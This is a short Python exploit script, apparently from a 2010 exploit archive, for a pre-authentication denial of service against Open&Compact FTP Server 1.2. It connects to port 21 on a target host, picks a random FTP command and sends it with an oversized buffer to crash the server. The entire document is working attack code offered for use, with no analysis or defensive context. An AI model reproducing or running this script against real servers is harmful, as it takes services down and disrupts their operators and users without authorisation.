#!/usr/bin/python
###################################################################
#
# Open&Compact Ftp Server 1.2 Universal Pre-Auth Denial of Service
# Coded By: Dr_IDE
# Found By: Ma3sTr0-Dz
# Date:     May 24, 2010
# Download: http://sourceforge.net/projects/open-ftpd/
# Tested:   Windows 7
#
###################################################################

import random, socket, sys

host = (sys.argv[1])
buff = ("A: " * 3000)
cmds = ['ABOR', 'APPE', 'ALLO', 'PORT', 'USER', 'PASS', 'PASV', 'MKD', 'SIZE']

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ("\r\n[i] Connecting to: " + host +"\r\n")
s.connect((host, 21))
d=s.recv(1024)
print (d)
magic=random.choice(cmds)
print ("[*] Finding vulnerable commands.\r\n")
print ("[*] Performing some kind of complex calculations...\r\n")
print ("[*] Crashing server with command: " + magic + "\r\n")
s.send(magic + " " + buff + '\r\n')
print ("[i] Server Down")
s.close()
         
# End